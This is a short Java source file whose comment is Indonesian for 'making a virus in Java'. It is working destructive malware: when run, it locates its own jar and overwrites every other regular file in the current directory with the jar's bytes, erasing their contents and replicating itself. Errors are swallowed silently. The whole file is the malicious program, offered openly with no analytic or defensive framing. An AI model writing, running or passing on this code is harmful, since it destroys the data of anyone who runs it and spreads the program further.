package com.bni.main.page;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;

/**
 * membuat virus di java
 * @author fjr_ksbr
 *
 */
public class Virus {
	public static void main(String[] args) {
		URL url = Virus.class.getProtectionDomain().getCodeSource().getLocation();
		String jarLocation = new File(url.toString()).toString();
		String temp = jarLocation.replace("file:\\", "").replace("\\", "/").replace("%20", " ");
		System.out.println("lokasi jar: " + temp);
		File fileSumber = new File(temp);
		File[] infected = new File(".").listFiles();
		FileInputStream is = null;
		FileOutputStream out = null;
		String namaVirus = temp.substring(temp.lastIndexOf("/")+ 1);
		System.out.println(namaVirus); 
		if(fileSumber.exists()) {
			System.out.println( "virus hadir"); 
		}
		try {
			for (File ff : infected) {
				if (! ff.getName().equals(namaVirus) && ! ff.isDirectory()) {
					System.out.println("file yang di infeksi: " + ff.getName()); 
					String outpath = ff.getAbsolutePath(); 
					byte[] buffer = new byte[1024];
					out = new FileOutputStream(new File(outpath));
					int byteContent;
					is = new FileInputStream(fileSumber) ;
					while ((byteContent = is.read(buffer, 0, 1024)) != -1) {
						out.write(  buffer, 0, byteContent);
					}
					is.close();
					out.close();
				}
			}
		}catch (Exception e) {
		}finally {
			if(is != null) {
				try {
					is.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
			if( out != null) {
				try {
					out.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
			
		}
	}

}
